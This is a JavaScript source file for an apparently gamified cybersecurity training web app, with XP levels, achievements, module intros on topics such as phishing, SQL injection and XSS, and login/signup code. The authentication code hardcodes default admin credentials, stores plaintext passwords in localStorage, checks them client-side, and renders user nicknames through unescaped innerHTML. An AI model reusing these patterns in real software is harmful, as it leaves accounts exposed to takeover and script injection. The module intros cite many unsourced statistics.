/* ===== CyberSafe v2.1 — Ultimate Cybersecurity Training Platform ===== */

const LEVELS = [
  { level:1, title:'Cyber Rookie', xpReq:0 },
  { level:2, title:'Script Kiddie', xpReq:200 },
  { level:3, title:'Data Scout', xpReq:500 },
  { level:4, title:'Security Intern', xpReq:900 },
  { level:5, title:'Security Apprentice', xpReq:1400 },
  { level:6, title:'Threat Analyst', xpReq:2000 },
  { level:7, title:'Cyber Sentinel', xpReq:2800 },
  { level:8, title:'Encryption Wizard', xpReq:3800 },
  { level:9, title:'Cyber Guardian', xpReq:5000 },
  { level:10, title:'Master Hacker', xpReq:6500 },
  { level:11, title:'Digital Overlord', xpReq:8500 },
  { level:12, title:'Cyber Legend', xpReq:11000 }
];

const ACHIEVEMENTS = [
  { id:'first_login', name:'First Access', icon:'🔓', desc:'Logged into CyberSafe for the first time' },
  { id:'password_pro', name:'Password Guru', icon:'🔑', desc:'Mastered the Password Personality Test' },
  { id:'phishing_expert', name:'Phishing Detective', icon:'🎣', desc:'Identified all phishing emails correctly' },
  { id:'escape_artist', name:'Escape Artist', icon:'🚪', desc:'Escaped the Digital Escape Room' },
  { id:'privacy_shield', name:'Privacy Shield', icon:'🛡️', desc:'Protected all personal data' },
  { id:'social_guard', name:'Social Guardian', icon:'🎭', desc:'Resisted all social engineering attacks' },
  { id:'cipher_master', name:'Cipher Master', icon:'🔐', desc:'Decoded all cipher challenges' },
  { id:'code_cracker', name:'Code Cracker', icon:'💻', desc:'Cracked all authentication puzzles' },
  { id:'ctf_champion', name:'CTF Champion', icon:'🏴', desc:'Captured all the flags' },
  { id:'net_defender', name:'Network Defender', icon:'🌐', desc:'Successfully defended the network' },
  { id:'forensics_pro', name:'Digital Sherlock', icon:'🔍', desc:'Solved the forensics investigation' },
  { id:'sql_stopper', name:'Injection Blocker', icon:'💉', desc:'Mastered SQL injection defense' },
  { id:'xss_hunter', name:'XSS Hunter', icon:'⚡', desc:'Identified all XSS vulnerabilities' },
  { id:'stego_finder', name:'Hidden Eye', icon:'👁️', desc:'Found all steganography secrets' },
  { id:'fake_news_killer', name:'Truth Seeker', icon:'📰', desc:'Identified all fake news' },
  { id:'wifi_warrior', name:'WiFi Warrior', icon:'📡', desc:'Secured all wireless networks' },
  { id:'ransom_hero', name:'Ransom Hero', icon:'💰', desc:'Survived the ransomware attack' },
  { id:'level5', name:'Halfway There', icon:'⭐', desc:'Reached Level 5' },
  { id:'level10', name:'Elite Hacker', icon:'👑', desc:'Reached Level 10' },
  { id:'completionist', name:'Completionist', icon:'🏆', desc:'Completed all games' },
];

const AVATAR_OPTIONS = ['🤖','👤','🦊','🐱','🐺','🦅','🦉','🐉','👾','💀','🎭','🧑‍💻','👨‍💻','👩‍💻','🥷','🧙','🦸','🕵️','🧑‍🚀','🦾','🐧','🐍','🤠','👻','🛡️','⚔️','🔮','🎯'];

const DEFAULT_USERS = {
  cyberguest: { password:'cyber123', nickname:'CyberGuest', role:'user', xp:0, achievements:[], completedGames:[], avatar:'🤖', bio:'', title:'Cyber Trainee' },
  admin: { password:'admin123', nickname:'Admin', role:'admin', xp:0, achievements:[], completedGames:[], avatar:'🛡️', bio:'Platform Administrator', title:'System Admin' }
};

let currentUser = null;
let users = {};
let currentView = 'home';
let currentMode = null;

// ==================== GAME INTROS ====================
const GAME_INTROS = {
  password: {
    title: 'Password Security',
    subtitle: 'Your first line of defense',
    icon: '🔑',
    color: '#00f0ff',
    overview: 'Passwords are the keys to your digital life. A weak password is like leaving your front door wide open — anyone can walk in.',
    facts: [
      '81% of data breaches involve weak or stolen passwords',
      'The most common password is still "123456"',
      'A 6-character password can be cracked in under 1 second',
      'Adding symbols and length increases crack time exponentially'
    ],
    concepts: ['Brute Force Attacks — trying every combination', 'Dictionary Attacks — using common words and passwords', 'Credential Stuffing — using leaked passwords on other sites', 'Password Entropy — measuring password randomness'],
    whatYouLearn: 'You\'ll test different passwords and see how an AI analyst rates their strength, estimated crack time, and vulnerabilities.'
  },
  phishing: {
    title: 'Phishing & Email Scams',
    subtitle: 'Don\'t take the bait',
    icon: '🎣',
    color: '#39ff14',
    overview: 'Phishing is a social engineering attack where criminals send fake messages designed to trick you into revealing sensitive information or clicking malicious links.',
    facts: [
      '91% of cyberattacks start with a phishing email',
      'Phishing attacks cost businesses $4.91 billion annually',
      'The average phishing site exists for only 15 hours',
      'Spear phishing targets specific individuals with personalized attacks'
    ],
    concepts: ['Spoofed Domains — fake websites that look real', 'Urgency Tactics — "Act now or lose your account!"', 'Link Manipulation — hovering reveals the real URL', 'Business Email Compromise (BEC) — impersonating executives'],
    whatYouLearn: 'You\'ll analyze real-looking emails and learn to spot the red flags that separate legitimate messages from dangerous phishing attempts.'
  },
  escape: {
    title: 'Cyber Awareness & Threats',
    subtitle: 'Security starts with awareness',
    icon: '🚪',
    color: '#b026ff',
    overview: 'Cyber threats aren\'t just about code — they exploit human behavior, physical access, and poor security practices in everyday workplaces.',
    facts: [
      '95% of cybersecurity breaches are caused by human error',
      'USB drop attacks have a 45-98% success rate',
      'Sticky note passwords are found in 1 in 4 offices',
      'Physical security breaches account for 10% of data theft'
    ],
    concepts: ['USB Drop Attacks — infected drives left in public places', 'Shoulder Surfing — watching someone type passwords', 'Tailgating — following someone through secure doors', 'Clean Desk Policy — keeping sensitive info secured'],
    whatYouLearn: 'Navigate through a virtual office, discover security violations, and solve puzzles to escape — learning real workplace security along the way.'
  },
  privacy: {
    title: 'Digital Privacy',
    subtitle: 'Your data, your rules',
    icon: '🔒',
    color: '#ff6b00',
    overview: 'Every time you go online, you leave a digital footprint. Companies, advertisers, and cybercriminals all want your personal data — knowing what to share (and what not to) is critical.',
    facts: [
      'The average person has 100+ online accounts',
      'Data brokers collect and sell personal info for $0.01-$0.50 per record',
      'Identity theft affects 15 million Americans annually',
      '87% of people can be uniquely identified by ZIP code, birthdate, and gender'
    ],
    concepts: ['Data Minimization — share only what\'s necessary', 'Two-Factor Authentication (2FA) — extra login security', 'Privacy Settings — controlling who sees your information', 'Digital Footprint — the trail you leave online'],
    whatYouLearn: 'You\'ll manage privacy settings for a digital profile and see the real-world consequences of each choice you make.'
  },
  social: {
    title: 'Social Engineering',
    subtitle: 'Hacking the human',
    icon: '🎭',
    color: '#ff2d7b',
    overview: 'Social engineering manipulates people into breaking security procedures. Attackers exploit trust, fear, and urgency — the human is often the weakest link in security.',
    facts: [
      '98% of cyberattacks rely on some form of social engineering',
      'The average social engineering attack costs companies $130,000',
      'Kevin Mitnick, famous hacker, said: "I was never really technical. I used social engineering."',
      'Pretexting (creating a fake scenario) is the #1 social engineering technique'
    ],
    concepts: ['Pretexting — creating a fabricated scenario', 'Baiting — offering something enticing (free USB, download)', 'Quid Pro Quo — offering a service in exchange for info', 'Authority — impersonating someone in power'],
    whatYouLearn: 'Chat with NPC characters who try to manipulate you using real social engineering techniques. Learn to recognize and resist these attacks.'
  },
  fakenews: {
    title: 'Misinformation & Fake News',
    subtitle: 'Separate fact from fiction',
    icon: '📰',
    color: '#ffe600',
    overview: 'In the cybersecurity world, misinformation spreads as fast as malware. Fake headlines cause panic, distract from real threats, and can be weaponized to manipulate behavior.',
    facts: [
      'Fake news spreads 6x faster than real news on social media',
      '86% of internet users have been fooled by fake news at least once',
      'Cyber misinformation is used in 78% of nation-state influence campaigns',
      'FUD (Fear, Uncertainty, Doubt) is a deliberate disinformation strategy'
    ],
    concepts: ['FUD — Fear, Uncertainty, and Doubt tactics', 'Source Verification — checking where info comes from', 'Confirmation Bias — believing what fits our worldview', 'Media Literacy — critically evaluating information'],
    whatYouLearn: 'Read cybersecurity headlines and determine which are real threats and which are misinformation or conspiracy theories.'
  },
  wifi: {
    title: 'Wireless Network Security',
    subtitle: 'Not all WiFi is safe',
    icon: '📡',
    color: '#00a8ff',
    overview: 'Public WiFi networks are hunting grounds for hackers. Evil twin attacks, packet sniffing, and man-in-the-middle attacks can steal your data on unsecured networks.',
    facts: [
      '40% of people have had their info compromised on public WiFi',
      'Setting up a fake WiFi hotspot takes under 5 minutes',
      'HTTPS doesn\'t fully protect you on compromised networks',
      'WiFi pineapple devices automate WiFi attacks for under $100'
    ],
    concepts: ['Evil Twin — a fake access point mimicking a real one', 'Man-in-the-Middle (MITM) — intercepting communications', 'Packet Sniffing — capturing data flowing over a network', 'VPN — encrypting your internet traffic'],
    whatYouLearn: 'Analyze wireless networks and classify them as safe or dangerous based on their names, encryption, and warning signs.'
  },
  ransomware: {
    title: 'Ransomware Response',
    subtitle: 'When crisis strikes',
    icon: '💰',
    color: '#ff3333',
    overview: 'Ransomware encrypts your files and demands payment. It\'s one of the fastest-growing cyber threats, costing billions annually and shutting down hospitals, schools, and businesses.',
    facts: [
      'A ransomware attack occurs every 11 seconds',
      'The average ransom payment is $812,000',
      'Only 65% of organizations who pay actually recover their data',
      'Ransomware damages are predicted to reach $265 billion by 2031'
    ],
    concepts: ['Encryption — ransomware locks files with strong encryption', 'Double Extortion — encrypting AND stealing data', 'Incident Response — the process of handling a security breach', 'Air-Gapped Backups — offline backups attackers can\'t reach'],
    whatYouLearn: 'Navigate a realistic ransomware crisis scenario stage by stage, making critical decisions that determine whether your organization survives.'
  },
  cipher: {
    title: 'Cryptography & Ciphers',
    subtitle: 'The art of secret writing',
    icon: '🔐',
    color: '#00f0ff',
    overview: 'Cryptography is the foundation of digital security. From ancient Caesar ciphers to modern AES encryption, encoding information keeps secrets safe from prying eyes.',
    facts: [
      'The Caesar cipher was used by Julius Caesar in 50 BC',
      'The Enigma machine had 158 quintillion possible settings',
      'AES-256 encryption would take billions of years to crack by brute force',
      'Quantum computers may eventually break current encryption methods'
    ],
    concepts: ['Substitution Ciphers — replacing letters with others', 'Encoding vs Encryption — encoding is NOT security', 'Symmetric vs Asymmetric — shared key vs public/private key', 'Hashing — one-way transformation of data'],
    whatYouLearn: 'Decode messages encrypted with Caesar, Binary, Hex, Base64, ROT13, Morse code, and more. Learn how each method works.'
  },
  codebreaker: {
    title: 'Authentication & Cracking',
    subtitle: 'Break the code',
    icon: '💻',
    color: '#39ff14',
    overview: 'Authentication verifies who you are. Understanding how authentication works — and how it breaks — is essential for both defenders and ethical hackers.',
    facts: [
      'Hashed passwords are stored as fixed-length strings',
      'Rainbow tables contain pre-computed hashes for billions of passwords',
      'JWT tokens are used by 67% of modern web applications',
      'The first computer password was created at MIT in 1961'
    ],
    concepts: ['Hashing — MD5, SHA-256, bcrypt algorithms', 'Rainbow Tables — pre-computed hash lookups', 'JWT Tokens — JSON Web Tokens for authentication', 'Salting — adding random data to prevent rainbow table attacks'],
    whatYouLearn: 'Solve authentication puzzles involving pattern recognition, hash identification, timestamp decoding, and JWT vulnerabilities.'
  },
  ctf: {
    title: 'Capture The Flag (CTF)',
    subtitle: 'Find the hidden flags',
    icon: '🏴',
    color: '#b026ff',
    overview: 'CTF competitions are the playground of cybersecurity professionals. Teams solve challenges across categories like crypto, forensics, web, and reverse engineering to find hidden "flags."',
    facts: [
      'DEF CON CTF is the "Super Bowl" of hacking competitions',
      'CTFs teach more practical skills than most cybersecurity courses',
      'The CTF community has over 100,000 active participants worldwide',
      'Top CTF players are actively recruited by security firms and governments'
    ],
    concepts: ['Flag Format — FLAG{...} is the standard format', 'Challenge Categories — crypto, forensics, web, reverse engineering', 'Encoding Recognition — identifying Base64, hex, binary, etc.', 'Source Code Analysis — finding secrets hidden in code'],
    whatYouLearn: 'Find hidden flags in encoded messages, HTML source code, encrypted text, and binary data — just like in real CTF competitions.'
  },
  network: {
    title: 'Network Defense',
    subtitle: 'Protect the perimeter',
    icon: '🌐',
    color: '#ff6b00',
    overview: 'Network defense is the art of protecting computer networks from attacks. Security analysts monitor traffic, configure firewalls, and respond to threats in real time.',
    facts: [
      'The average network breach takes 287 days to detect',
      'DDoS attacks can generate over 1 Tbps of traffic',
      'Firewalls block an average of 10,000+ threats per day',
      'Zero-day vulnerabilities sell for $100K-$2.5M on black markets'
    ],
    concepts: ['Firewalls — filtering network traffic by rules', 'IDS/IPS — Intrusion Detection/Prevention Systems', 'DDoS Mitigation — absorbing volumetric attacks', 'Incident Response — detect, contain, eradicate, recover'],
    whatYouLearn: 'Defend a network against real attack scenarios including DDoS, SQL injection, brute force, port scanning, malware beacons, and phishing campaigns.'
  },
  forensics: {
    title: 'Digital Forensics',
    subtitle: 'Investigate the incident',
    icon: '🔍',
    color: '#ff2d7b',
    overview: 'Digital forensics is the science of collecting, analyzing, and preserving electronic evidence. Forensic analysts reconstruct cyber incidents to find who, what, when, and how.',
    facts: [
      'Digital evidence is used in 90% of criminal cases today',
      'Deleted files can often be recovered from hard drives',
      'The average data breach costs $4.45 million to investigate',
      'Forensic analysts follow strict chain-of-custody procedures'
    ],
    concepts: ['Chain of Custody — preserving evidence integrity', 'Log Analysis — reading system and network logs', 'Timeline Reconstruction — piecing together events', 'Indicators of Compromise (IOC) — signs of a breach'],
    whatYouLearn: 'Investigate a full cyber incident: analyze emails, access logs, network captures, malware samples, and timelines to solve the case.'
  },
  sqli: {
    title: 'SQL Injection',
    subtitle: 'The #1 web vulnerability',
    icon: '💉',
    color: '#ffe600',
    overview: 'SQL Injection is one of the most dangerous and common web vulnerabilities. Attackers manipulate database queries through user input to steal, modify, or delete data.',
    facts: [
      'SQL Injection has been in the OWASP Top 10 since its inception',
      'The 2017 Equifax breach exposed 147 million records via SQLi',
      'SQLi can be automated — tools like sqlmap test thousands of parameters',
      'Parameterized queries prevent 99.9% of SQL injection attacks'
    ],
    concepts: ['Query Manipulation — injecting SQL into user inputs', 'UNION Attacks — combining queries to extract data', 'Blind SQLi — extracting data without visible output', 'Parameterized Queries — the #1 prevention method'],
    whatYouLearn: 'Progress through 5 levels of SQL injection — from basic login bypass to advanced blind injection — and learn how to prevent each type.'
  },
  xss: {
    title: 'Cross-Site Scripting (XSS)',
    subtitle: 'Injecting malicious scripts',
    icon: '⚡',
    color: '#00a8ff',
    overview: 'XSS allows attackers to inject malicious scripts into web pages viewed by other users. It can steal cookies, redirect users, or deface websites.',
    facts: [
      'XSS is found in 2 out of 3 web applications',
      'Stored XSS can affect thousands of users simultaneously',
      'XSS can steal session cookies, enabling account takeover',
      'Content Security Policy (CSP) is the strongest XSS defense'
    ],
    concepts: ['Reflected XSS — script in the URL, executed on page load', 'Stored XSS — script saved in database, attacks all visitors', 'DOM XSS — script manipulates page via JavaScript', 'CSP — Content Security Policy header for defense'],
    whatYouLearn: 'Explore all three types of XSS vulnerabilities, learn how cookie theft works, and discover how Content Security Policy stops these attacks.'
  },
  stego: {
    title: 'Steganography',
    subtitle: 'Hidden in plain sight',
    icon: '👁️',
    color: '#ff3333',
    overview: 'Steganography is the practice of hiding messages within other data — images, text, audio, or files. Unlike encryption (which scrambles data), steganography hides the fact that a message exists at all.',
    facts: [
      'Terrorists have used steganography to hide messages in images',
      'A single image can hide megabytes of secret data',
      'Digital watermarking uses steganography to protect copyrights',
      'Ancient Greeks tattooed messages on shaved heads, hidden when hair regrew'
    ],
    concepts: ['LSB Encoding — hiding data in image pixel bits', 'Null Ciphers — messages hidden in the first letters of words', 'File Header Analysis — detecting disguised file types', 'Metadata Hiding — secrets in EXIF data, comments'],
    whatYouLearn: 'Find hidden messages using acrostic ciphers, zero-width characters, whitespace encoding, file header analysis, and metadata extraction.'
  }
};

// ==================== GAME THEMES ====================
const GAME_THEMES = {
  password:    { bg:'radial-gradient(ellipse at 20% 50%, rgba(0,240,255,0.06) 0%, transparent 60%)', accent:'#00f0ff', glow:'0 0 30px rgba(0,240,255,0.15)' },
  phishing:    { bg:'radial-gradient(ellipse at 80% 30%, rgba(57,255,20,0.06) 0%, transparent 60%)', accent:'#39ff14', glow:'0 0 30px rgba(57,255,20,0.15)' },
  escape:      { bg:'radial-gradient(ellipse at 50% 80%, rgba(176,38,255,0.06) 0%, transparent 60%)', accent:'#b026ff', glow:'0 0 30px rgba(176,38,255,0.15)' },
  privacy:     { bg:'radial-gradient(ellipse at 30% 20%, rgba(255,107,0,0.06) 0%, transparent 60%)', accent:'#ff6b00', glow:'0 0 30px rgba(255,107,0,0.15)' },
  social:      { bg:'radial-gradient(ellipse at 70% 60%, rgba(255,45,123,0.06) 0%, transparent 60%)', accent:'#ff2d7b', glow:'0 0 30px rgba(255,45,123,0.15)' },
  fakenews:    { bg:'radial-gradient(ellipse at 40% 40%, rgba(255,230,0,0.05) 0%, transparent 60%)', accent:'#ffe600', glow:'0 0 30px rgba(255,230,0,0.12)' },
  wifi:        { bg:'radial-gradient(ellipse at 60% 70%, rgba(0,168,255,0.06) 0%, transparent 60%)', accent:'#00a8ff', glow:'0 0 30px rgba(0,168,255,0.15)' },
  ransomware:  { bg:'radial-gradient(ellipse at 50% 30%, rgba(255,51,51,0.06) 0%, transparent 60%)', accent:'#ff3333', glow:'0 0 30px rgba(255,51,51,0.15)' },
  cipher:      { bg:'radial-gradient(ellipse at 20% 50%, rgba(0,240,255,0.06) 0%, transparent 60%)', accent:'#00f0ff', glow:'0 0 30px rgba(0,240,255,0.15)' },
  codebreaker: { bg:'radial-gradient(ellipse at 80% 30%, rgba(57,255,20,0.06) 0%, transparent 60%)', accent:'#39ff14', glow:'0 0 30px rgba(57,255,20,0.15)' },
  ctf:         { bg:'radial-gradient(ellipse at 50% 80%, rgba(176,38,255,0.06) 0%, transparent 60%)', accent:'#b026ff', glow:'0 0 30px rgba(176,38,255,0.15)' },
  network:     { bg:'radial-gradient(ellipse at 30% 20%, rgba(255,107,0,0.06) 0%, transparent 60%)', accent:'#ff6b00', glow:'0 0 30px rgba(255,107,0,0.15)' },
  forensics:   { bg:'radial-gradient(ellipse at 70% 60%, rgba(255,45,123,0.06) 0%, transparent 60%)', accent:'#ff2d7b', glow:'0 0 30px rgba(255,45,123,0.15)' },
  sqli:        { bg:'radial-gradient(ellipse at 40% 40%, rgba(255,230,0,0.05) 0%, transparent 60%)', accent:'#ffe600', glow:'0 0 30px rgba(255,230,0,0.12)' },
  xss:         { bg:'radial-gradient(ellipse at 60% 70%, rgba(0,168,255,0.06) 0%, transparent 60%)', accent:'#00a8ff', glow:'0 0 30px rgba(0,168,255,0.15)' },
  stego:       { bg:'radial-gradient(ellipse at 50% 30%, rgba(255,51,51,0.06) 0%, transparent 60%)', accent:'#ff3333', glow:'0 0 30px rgba(255,51,51,0.15)' }
};

function loadUsers() {
  const saved = localStorage.getItem('cybersafe_users_v2');
  if (saved) {
    users = JSON.parse(saved);
    for (const [k,v] of Object.entries(DEFAULT_USERS)) {
      if (!users[k]) users[k] = {...v};
      else { if(!users[k].avatar) users[k].avatar='🤖'; if(!users[k].bio) users[k].bio=''; if(!users[k].title) users[k].title='Cyber Trainee'; }
    }
    // Migrate existing users
    for (const k in users) { if(!users[k].avatar) users[k].avatar='🤖'; if(!users[k].bio) users[k].bio=''; if(!users[k].title) users[k].title='Cyber Trainee'; }
  } else { users = JSON.parse(JSON.stringify(DEFAULT_USERS)); }
  saveUsers();
}
function saveUsers() { localStorage.setItem('cybersafe_users_v2', JSON.stringify(users)); }
function getUser() { return users[currentUser]; }
function addXP(amount) {
  const u = getUser(); u.xp += amount; saveUsers(); showXPPopup(amount); updateNavStats();
  const lvl = getUserLevel(u);
  if (lvl.level >= 5) unlockAchievement('level5');
  if (lvl.level >= 10) unlockAchievement('level10');
}
function getUserLevel(u) { let lvl = LEVELS[0]; for (const l of LEVELS) { if (u.xp >= l.xpReq) lvl = l; } return lvl; }
function getNextLevel(u) { const cur = getUserLevel(u); return LEVELS.find(l => l.level === cur.level + 1) || null; }
function unlockAchievement(id) {
  const u = getUser(); if (u.achievements.includes(id)) return;
  u.achievements.push(id); saveUsers();
  const ach = ACHIEVEMENTS.find(a => a.id === id); if (ach) showAchievementPopup(ach);
  if (u.completedGames.length >= 16) unlockAchievement('completionist');
}
function markGameComplete(gameId) { const u = getUser(); if (!u.completedGames.includes(gameId)) { u.completedGames.push(gameId); saveUsers(); } }

function initParticles() {
  const canvas = document.getElementById('particles-canvas');
  const ctx = canvas.getContext('2d');
  let w, h, particles = [];
  function resize() { w = canvas.width = window.innerWidth; h = canvas.height = window.innerHeight; }
  resize(); window.addEventListener('resize', resize);
  for (let i = 0; i < 80; i++) {
    particles.push({ x:Math.random()*w, y:Math.random()*h, vx:(Math.random()-0.5)*0.4, vy:(Math.random()-0.5)*0.4, r:Math.random()*1.5+0.5,
      color:['rgba(0,240,255,','rgba(57,255,20,','rgba(176,38,255,'][Math.floor(Math.random()*3)] });
  }
  function draw() {
    ctx.clearRect(0,0,w,h);
    for (let i=0;i<particles.length;i++) {
      const p=particles[i]; p.x+=p.vx; p.y+=p.vy;
      if(p.x<0)p.x=w; if(p.x>w)p.x=0; if(p.y<0)p.y=h; if(p.y>h)p.y=0;
      ctx.beginPath(); ctx.arc(p.x,p.y,p.r,0,Math.PI*2); ctx.fillStyle=p.color+'0.6)'; ctx.fill();
      for(let j=i+1;j<particles.length;j++){const q=particles[j];const dx=p.x-q.x,dy=p.y-q.y;const dist=Math.sqrt(dx*dx+dy*dy);
        if(dist<120){ctx.beginPath();ctx.moveTo(p.x,p.y);ctx.lineTo(q.x,q.y);ctx.strokeStyle=p.color+(0.15*(1-dist/120))+')';ctx.lineWidth=0.5;ctx.stroke();}}
    }
    requestAnimationFrame(draw);
  }
  draw();
}

function initMatrixRain() {
  const canvas = document.getElementById('matrix-canvas');
  const ctx = canvas.getContext('2d');
  canvas.width = window.innerWidth; canvas.height = window.innerHeight;
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#$%^&*アイウエオカキクケコ';
  const fontSize = 12; const columns = Math.floor(canvas.width/fontSize); const drops = Array(columns).fill(1);
  let interval = setInterval(() => {
    ctx.fillStyle='rgba(10,10,15,0.08)'; ctx.fillRect(0,0,canvas.width,canvas.height);
    ctx.fillStyle='#00f0ff'; ctx.font=fontSize+'px monospace';
    for(let i=0;i<drops.length;i++){const char=chars[Math.floor(Math.random()*chars.length)];
      ctx.globalAlpha=Math.random()*0.5+0.1; ctx.fillText(char,i*fontSize,drops[i]*fontSize);
      if(drops[i]*fontSize>canvas.height&&Math.random()>0.975)drops[i]=0; drops[i]++;}
    ctx.globalAlpha=1;
  }, 45);
  return () => { clearInterval(interval); ctx.clearRect(0,0,canvas.width,canvas.height); canvas.style.display='none'; };
}

function runBootSequence() {
  const bootScreen = document.getElementById('boot-screen');
  const terminal = document.getElementById('boot-terminal');
  const progressBar = document.querySelector('.boot-progress-bar');
  const stopMatrix = initMatrixRain();
  const lines = [
    {text:'> CyberSafe Security Framework v2.1.0',cls:'system',delay:300},
    {text:'  Developed by CyberSafe Research Division',cls:'info',delay:200},
    {text:'',cls:'',delay:100},
    {text:'> Initializing quantum encryption layer...',cls:'system',delay:400},
    {text:'  [OK] AES-256 cipher suite loaded',cls:'success',delay:200},
    {text:'  [OK] RSA-4096 key pair generated',cls:'success',delay:150},
    {text:'  [OK] TLS 1.3 handshake protocol ready',cls:'success',delay:150},
    {text:'',cls:'',delay:100},
    {text:'> Loading threat intelligence database...',cls:'system',delay:500},
    {text:'  [WARN] 2,847 new threat signatures detected',cls:'warning',delay:300},
    {text:'  [OK] Threat database synchronized',cls:'success',delay:200},
    {text:'',cls:'',delay:100},
    {text:'> Deploying cyber training modules...',cls:'system',delay:400},
    {text:'  Module: Public Cyber Awareness [8 missions]',cls:'info',delay:200},
    {text:'  Module: Cybersecurity Training [8 missions]',cls:'info',delay:200},
    {text:'  [OK] All modules operational',cls:'success',delay:200},
    {text:'',cls:'',delay:100},
    {text:'> Calibrating gamification engine...',cls:'system',delay:300},
    {text:'  [OK] XP tracking system online',cls:'success',delay:150},
    {text:'  [OK] Achievement system armed',cls:'success',delay:150},
    {text:'',cls:'',delay:100},
    {text:'> Running final security diagnostics...',cls:'system',delay:600},
    {text:'  [OK] Firewall: ACTIVE',cls:'success',delay:150},
    {text:'  [OK] IDS/IPS: MONITORING',cls:'success',delay:150},
    {text:'  [OK] Sandbox: ISOLATED',cls:'success',delay:150},
    {text:'',cls:'',delay:200},
    {text:'█ ACCESS GRANTED — WELCOME TO CYBERSAFE █',cls:'success',delay:0},
  ];
  let i=0, progress=0;
  const totalDelay = lines.reduce((s,l)=>s+l.delay,0);
  function nextLine() {
    if(i>=lines.length){progressBar.style.width='100%';
      setTimeout(()=>{stopMatrix();bootScreen.style.transition='opacity 0.8s';bootScreen.style.opacity='0';
        setTimeout(()=>{bootScreen.style.display='none';showAuthScreen();},800);},600); return;}
    const line=lines[i]; if(line.text){const div=document.createElement('div');div.className='line '+line.cls;div.textContent=line.text;
      terminal.appendChild(div);terminal.parentElement.scrollTop=terminal.parentElement.scrollHeight;}
    progress+=line.delay/totalDelay*100; progressBar.style.width=Math.min(progress,98)+'%'; i++; setTimeout(nextLine,line.delay);
  }
  nextLine();
}

function switchAuthTab(tab) {
  document.querySelectorAll('.auth-tab').forEach(t=>t.classList.remove('active'));
  document.querySelectorAll('.auth-tab').forEach(t=>{if(t.textContent.trim().toUpperCase()===(tab==='login'?'LOGIN':'SIGN UP'))t.classList.add('active');});
  const formEl = document.getElementById('auth-form');
  hideAuthError();
  if(tab==='login'){
    formEl.innerHTML=`<div id="login-form">
      <input type="text" id="login-user" class="cyber-input" placeholder="Username" autocomplete="username" />
      <input type="password" id="login-pass" class="cyber-input" placeholder="Password" autocomplete="current-password" />
      <button class="cyber-btn" id="login-btn" style="width:100%;margin-top:8px;">ACCESS SYSTEM</button>
    </div>`;
    document.getElementById('login-btn').onclick=()=>{
      const u=document.getElementById('login-user').value.trim().toLowerCase(),p=document.getElementById('login-pass').value;
      if(!u||!p)return showAuthError('Please enter username and password');
      if(!users[u])return showAuthError('User not found');
      if(users[u].password!==p)return showAuthError('Incorrect password');
      currentUser=u; unlockAchievement('first_login'); enterApp();
    };
    document.getElementById('login-pass').addEventListener('keydown',e=>{if(e.key==='Enter')document.getElementById('login-btn').click();});
    document.getElementById('login-user').addEventListener('keydown',e=>{if(e.key==='Enter')document.getElementById('login-pass').focus();});
  } else {
    formEl.innerHTML=`<div id="signup-form">
      <input type="text" id="signup-user" class="cyber-input" placeholder="Choose a username" autocomplete="username" />
      <input type="password" id="signup-pass" class="cyber-input" placeholder="Choose a password" autocomplete="new-password" />
      <input type="text" id="signup-nick" class="cyber-input" placeholder="Nickname (optional)" />
      <button class="cyber-btn" id="signup-btn" style="width:100%;margin-top:8px;">CREATE AGENT</button>
    </div>`;
    document.getElementById('signup-btn').onclick=()=>{
      const u=document.getElementById('signup-user').value.trim().toLowerCase(),p=document.getElementById('signup-pass').value,n=document.getElementById('signup-nick').value.trim();
      if(!u||!p)return showAuthError('Username and password required');
      if(u.length<3)return showAuthError('Username must be at least 3 characters');
      if(p.length<4)return showAuthError('Password must be at least 4 characters');
      if(users[u])return showAuthError('Username already exists');
      users[u]={password:p,nickname:n||u,role:'user',xp:0,achievements:[],completedGames:[],avatar:'🤖',bio:'',title:'Cyber Trainee'};
      saveUsers(); currentUser=u; unlockAchievement('first_login'); enterApp();
    };
    document.getElementById('signup-nick').addEventListener('keydown',e=>{if(e.key==='Enter')document.getElementById('signup-btn').click();});
  }
}

function showAuthScreen() {
  const authScreen = document.getElementById('auth-screen');
  authScreen.style.display='flex'; authScreen.style.opacity='0';
  setTimeout(()=>{authScreen.style.transition='opacity 0.5s';authScreen.style.opacity='1';},50);
  switchAuthTab('login');
}
function showAuthError(msg){const el=document.getElementById('auth-error');el.textContent='⚠ '+msg;el.style.display='block';}
function hideAuthError(){document.getElementById('auth-error').style.display='none';}
function enterApp(){
  const authScreen=document.getElementById('auth-screen');authScreen.style.transition='opacity 0.5s';authScreen.style.opacity='0';
  setTimeout(()=>{authScreen.style.display='none';document.getElementById('main-app').style.display='block';currentView='home';renderApp();},500);
}

function showXPPopup(amount){
  const popup=document.createElement('div');popup.className='xp-popup';
  popup.innerHTML=`<div class="xp-popup-value">+${amount} XP</div><div class="xp-popup-label">EXPERIENCE GAINED</div>`;
  document.body.appendChild(popup); setTimeout(()=>popup.remove(),3200);
}
function showAchievementPopup(ach){
  const popup=document.createElement('div');popup.className='achievement-popup';
  popup.innerHTML=`<div class="achievement-icon">${ach.icon}</div><div style="font-family:var(--font-mono);font-size:10px;color:var(--neon-green);letter-spacing:3px;margin-bottom:8px;">ACHIEVEMENT UNLOCKED</div><div class="achievement-title">${ach.name}</div><div class="achievement-desc">${ach.desc}</div>`;
  document.body.appendChild(popup);
  setTimeout(()=>{popup.style.transition='opacity 0.5s,transform 0.5s';popup.style.opacity='0';popup.style.transform='translate(-50%,-50%) scale(0.8)';setTimeout(()=>popup.remove(),500);},3000);
}

function renderApp(){
  const u=getUser(),isAdmin=u.role==='admin',lvl=getUserLevel(u);
  document.getElementById('nav-area').innerHTML=`
    <div class="navbar">
      <div class="nav-brand" onclick="navigateTo('home')">⟨/⟩ CYBERSAFE</div>
      <div class="nav-center">
        <button class="nav-link ${currentView==='home'?'active':''}" onclick="navigateTo('home')">Dashboard</button>
        <button class="nav-link ${currentView==='resources'?'active':''}" onclick="navigateTo('resources')">Resources</button>
        <button class="nav-link ${currentView==='profile'?'active':''}" onclick="navigateTo('profile')">Profile</button>
        ${isAdmin?`<button class="nav-link ${currentView==='admin'?'active':''}" onclick="navigateTo('admin')">Admin</button>`:''}
      </div>
      <div class="nav-right">
        <div class="nav-xp" id="nav-xp">⚡ ${u.xp} XP</div>
        <div class="nav-level" id="nav-level">★ Lv.${lvl.level} ${lvl.title}</div>
        <div class="nav-user-btn" onclick="navigateTo('profile')">
          <div class="nav-avatar">${u.avatar||'🤖'}</div>
          <span>${u.nickname||currentUser}</span>
        </div>
      </div>
    </div>`;
  renderContent();
}
